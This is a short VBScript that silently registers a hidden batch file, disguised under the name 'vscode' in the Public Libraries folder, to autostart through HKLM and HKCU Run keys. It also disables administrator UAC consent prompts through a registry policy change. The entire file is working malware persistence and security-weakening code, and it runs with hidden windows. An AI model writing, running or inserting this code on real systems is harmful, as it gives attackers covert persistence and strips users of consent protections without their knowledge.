set ws = CreateObject("wscript.shell")

ws.run "REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v vscode /t REG_SZ /d ""C:\Users\Public\Libraries\.vscode.bat""" , 0, false
ws.run "REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v vscode /t REG_SZ /d ""C:\Users\Public\Libraries\.vscode.bat""" , 0, false
ws.run "REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f" , 0, false